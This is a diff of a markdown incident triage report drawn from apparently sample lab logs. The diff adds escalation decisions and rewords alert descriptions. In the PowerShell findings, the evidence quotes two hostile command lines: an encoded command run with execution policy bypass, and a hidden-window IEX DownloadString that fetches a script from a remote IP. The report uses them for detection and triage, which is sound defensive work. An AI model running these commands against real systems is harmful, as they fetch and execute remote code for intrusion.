@@ -1,12 +1,13 @@
 # Incident Triage Notes
 
-Generated at: 2026-05-13T23:20:14+00:00
+Dataset: sample JSON/CSV lab logs
+Purpose: SIEM-style alert triage and timeline review
 
 ## Executive Summary
 
 - Total findings: 11
 - Highest severity: High
-- Severity breakdown: {'Medium': 4, 'High': 7}
+- Severity breakdown: High: 7, Medium: 4
 
 ## Timeline Reconstruction
 
@@ -64,6 +65,10 @@ Evidence:
 - failure_count=5
 - hosts=SRV-DC01
 
+Escalation Decision:
+
+Review in the analyst queue and escalate if the activity is not tied to expected user or admin behavior.
+
 False-Positive Considerations:
 
 - Service account password rotation or expired credentials can create repeated failures.
@@ -105,6 +110,10 @@ Evidence:
 - first_failure=2026-05-10T20:01:08+00:00
 - logon_type=Network
 
+Escalation Decision:
+
+Escalate for analyst review and correlate with identity, endpoint, and network logs before containment.
+
 False-Positive Considerations:
 
 - A legitimate user may mistype a password several times before succeeding.
@@ -126,7 +135,7 @@ Source IP: N/A
 
 Description:
 
-PowerShell command on SRV-DC01 used suspicious execution patterns commonly seen in script-based intrusion activity.
+PowerShell command on SRV-DC01 used suspicious execution flags or download/encoding behavior.
 
 MITRE ATT&CK Mapping:
 
@@ -145,6 +154,10 @@ Evidence:
 - event_id=4688
 - command_line=powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkA
 - sha256=7b3c2ef9d4bd9b33fc21675f933ad91ad31a92a0e132bd97d4be000000000000
+
+Escalation Decision:
+
+Escalate for analyst review and correlate with identity, endpoint, and network logs before containment.
 
 False-Positive Considerations:
 
@@ -167,7 +180,7 @@ Source IP: N/A
 
 Description:
 
-PowerShell command on WS-104 used suspicious execution patterns commonly seen in script-based intrusion activity.
+PowerShell command on WS-104 used suspicious execution flags or download/encoding behavior.
 
 MITRE ATT&CK Mapping:
 
@@ -186,6 +199,10 @@ Evidence:
 - event_id=4688
 - command_line=powershell.exe -WindowStyle Hidden IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.77/a.ps1')
 - sha256=985ee6c50f7a7f473d7d1111111111111111111111111111111111111111111
+
+Escalation Decision:
+
+Escalate for analyst review and correlate with identity, endpoint, and network logs before containment.
 
 False-Positive Considerations:
 
@@ -228,6 +245,10 @@ Evidence:
 - logon_type=Interactive
 - details=Normal workstation login
 
+Escalation Decision:
+
+Review in the analyst queue and escalate if the activity is not tied to expected user or admin behavior.
+
 False-Positive Considerations:
 
 - On-call, maintenance, backup, and international user activity may be legitimate.
@@ -268,6 +289,10 @@ Evidence:
 - utc_time=2026-05-10T20:07:02+00:00
 - logon_type=Network
 - details=Successful login after failures
+
+Escalation Decision:
+
+Escalate for analyst review and correlate with identity, endpoint, and network logs before containment.
 
 False-Positive Considerations:
 
@@ -310,6 +335,10 @@ Evidence:
 - logon_type=RemoteInteractive
 - details=VPN remote desktop session
 
+Escalation Decision:
+
+Escalate for analyst review and correlate with identity, endpoint, and network logs before containment.
+
 False-Positive Considerations:
 
 - On-call, maintenance, backup, and international user activity may be legitimate.
@@ -350,6 +379,10 @@ Evidence:
 - event_type=privilege
 - details=Special privileges assigned to new logon
 
+Escalation Decision:
+
+Review in the analyst queue and escalate if the activity is not tied to expected user or admin behavior.
+
 False-Positive Considerations:
 
 - Domain administrators and service accounts may legitimately receive special privileges.
@@ -389,6 +422,10 @@ Evidence:
 - time=2026-05-11T01:18:03+00:00
 - event_type=account_change
 - details=User added to privileged group
+
+Escalation Decision:
+
+Escalate for analyst review and correlate with identity, endpoint, and network logs before containment.
 
 False-Positive Considerations:
 
@@ -433,6 +470,10 @@ Evidence:
 - bytes_out=145232
 - category=unknown
 
+Escalation Decision:
+
+Escalate for analyst review and correlate with identity, endpoint, and network logs before containment.
+
 False-Positive Considerations:
 
 - Unusual ports may be used by legitimate internal tools or development services.
@@ -475,6 +516,10 @@ Evidence:
 - action=allow
 - bytes_out=84212
 - category=unknown
+
+Escalation Decision:
+
+Review in the analyst queue and escalate if the activity is not tied to expected user or admin behavior.
 
 False-Positive Considerations:
 
